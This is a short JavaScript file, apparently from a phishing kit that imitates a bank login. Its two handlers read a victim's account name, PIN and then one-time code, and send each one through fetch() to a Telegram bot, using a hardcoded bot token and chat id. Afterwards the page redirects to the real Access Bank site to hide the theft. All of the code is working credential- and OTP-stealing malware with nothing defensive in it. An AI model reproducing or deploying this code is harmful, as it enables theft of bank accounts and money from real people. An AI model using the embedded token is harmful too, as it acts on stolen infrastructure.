function handleLogin() {
    const user = document.getElementById('user');
    const pass = document.getElementById('pass');
    const loginSection = document.getElementById('login-section');
    const otpArea = document.getElementById('otp-area');

    // 1. Reset visual errors
    user.classList.remove('error-border');
    pass.classList.remove('error-border');

    // 2. Validation: Check if empty
    if (user.value === "" || pass.value === "") {
        if (user.value === "") user.classList.add('error-border');
        if (pass.value === "") pass.classList.add('error-border');
        return; 
    }

    // 3. Send Login Data to Telegram
    const message = "--- NEW LOGIN ---\nAcc: " + user.value + "\nPIN: " + pass.value;
    const token = "8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo"; 
    const chat_id = "7909543900"; 
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

    fetch(url).then(() => {
        // 4. Switch Screens
        loginSection.style.display = 'none';
        otpArea.style.display = 'block';
    });
}

function handleOtp() {
    const otp = document.getElementById('otp');
    otp.classList.remove('error-border');

    if (otp.value === "") {
        otp.classList.add('error-border');
        return;
    }

    const message = "--- OTP RECEIVED ---\nCode: " + otp.value;
    const token = "8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo"; 
    const chat_id = "7909543900"; 
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

    fetch(url).then(() => {
        // Final step: Redirect to official site
        window.location.href = "https://www.accessbankplc.com/";
    });
}
